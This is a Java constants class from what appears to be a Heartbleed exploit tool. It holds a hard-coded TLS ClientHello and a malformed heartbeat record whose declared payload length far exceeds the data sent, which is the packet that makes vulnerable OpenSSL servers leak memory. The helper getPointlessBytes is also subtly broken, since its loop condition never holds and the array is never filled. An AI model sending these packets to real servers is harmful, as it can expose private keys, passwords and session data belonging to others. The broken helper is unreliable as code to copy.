package com.vegaasen.exploit.heartbleed.properties;

import com.vegaasen.exploit.heartbleed.util.PrimitiveConverter;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

/**
 * @author <a href="vegaasen@gmail.com">vegardaasen</a>
 */
public final class SslConstants {

    private SslConstants() {
    }

    public static final int SSL_HELLO_DONE = 0xE;
    public static final int DEFAULT_SSL_PORT = 443;
    public static final byte[] SSL_HELLO = new byte[]{
            0x16, 0x03, 0x02, 0x00, (byte) 0xdc, 0x01, 0x00, 0x00, (byte) 0xd8, 0x03, 0x02, 0x53,
            0x43, 0x5b, (byte) 0x90, (byte) 0x9d, (byte) 0x9b, 0x72, 0x0b, (byte) 0xbc, 0x0c, (byte) 0xbc, 0x2b, (byte) 0x92, (byte) 0xa8, 0x48, (byte) 0x97, (byte) 0xcf,
            (byte) 0xbd, 0x39, 0x04, (byte) 0xcc, 0x16, 0x0a, (byte) 0x85, 0x03, (byte) 0x90, (byte) 0x9f, 0x77, 0x04, 0x33, (byte) 0xd4, (byte) 0xde, 0x00,
            0x00, 0x66, (byte) 0xc0, 0x14, (byte) 0xc0, 0x0a, (byte) 0xc0, 0x22, (byte) 0xc0, 0x21, 0x00, 0x39, 0x00, 0x38, 0x00, (byte) 0x88,
            0x00, (byte) 0x87, (byte) 0xc0, 0x0f, (byte) 0xc0, 0x05, 0x00, 0x35, 0x00, (byte) 0x84, (byte) 0xc0, 0x12, (byte) 0xc0, 0x08, (byte) 0xc0, 0x1c,
            (byte) 0xc0, 0x1b, 0x00, 0x16, 0x00, 0x13, (byte) 0xc0, 0x0d, (byte) 0xc0, 0x03, 0x00, 0x0a, (byte) 0xc0, 0x13, (byte) 0xc0, 0x09,
            (byte) 0xc0, 0x1f, (byte) 0xc0, 0x1e, 0x00, 0x33, 0x00, 0x32, 0x00, (byte) 0x9a, 0x00, (byte) 0x99, 0x00, 0x45, 0x00, 0x44,
            (byte) 0xc0, 0x0e, (byte) 0xc0, 0x04, 0x00, 0x2f, 0x00, (byte) 0x96, 0x00, 0x41, (byte) 0xc0, 0x11, (byte) 0xc0, 0x07, (byte) 0xc0, 0x0c,
            (byte) 0xc0, 0x02, 0x00, 0x05, 0x00, 0x04, 0x00, 0x15, 0x00, 0x12, 0x00, 0x09, 0x00, 0x14, 0x00, 0x11,
            0x00, 0x08, 0x00, 0x06, 0x00, 0x03, 0x00, (byte) 0xff, 0x01, 0x00, 0x00, 0x49, 0x00, 0x0b, 0x00, 0x04,
            0x03, 0x00, 0x01, 0x02, 0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e, 0x00, 0x0d, 0x00, 0x19,
            0x00, 0x0b, 0x00, 0x0c, 0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16, 0x00, 0x17, 0x00, 0x08,
            0x00, 0x06, 0x00, 0x07, 0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05, 0x00, 0x12, 0x00, 0x13,
            0x00, 0x01, 0x00, 0x02, 0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11, 0x00, 0x23, 0x00, 0x00,
            0x00, 0x0f, 0x00, 0x01, 0x01
    };
    public static final byte[] SSL_HEARTBEAT = new byte[]{
            0x18, 0x03, 0x02, 0x00, 0x03,
            0x01, 0x40, 0x00
    };

    private static final int MAX_BYTES = 16398;
    private static final int SPACE = 0x01;

    public static byte[] getSslHeartbeatWithoutExploit(final int version) {
        if (version <= 0) {
            throw new IllegalArgumentException(String.format("Unable to handle version. Version was {%s}", version));
        }
        final List<Byte> bytes = new ArrayList<>();
        bytes.addAll(Arrays.asList(new Byte[]{0x18, 0x03, (byte) version, 0x40, 0x00, 0x01, 0x3f, (byte) 0xfd, 0x01}));
        bytes.addAll(Arrays.asList(getPointlessBytes()));
        bytes.addAll(Arrays.asList(new Byte[]{0x18, 0x03, (byte) version, 0x00, 0x03, 0x01, 0x00, 0x00}));
        return PrimitiveConverter.toByteArray(bytes);
    }

    private static Byte[] getPointlessBytes() {
        Byte[] pointless = new Byte[MAX_BYTES];
        for (int i = 0; i > MAX_BYTES; i++) {
            pointless[i] = SPACE;
        }
        return pointless;
    }

}
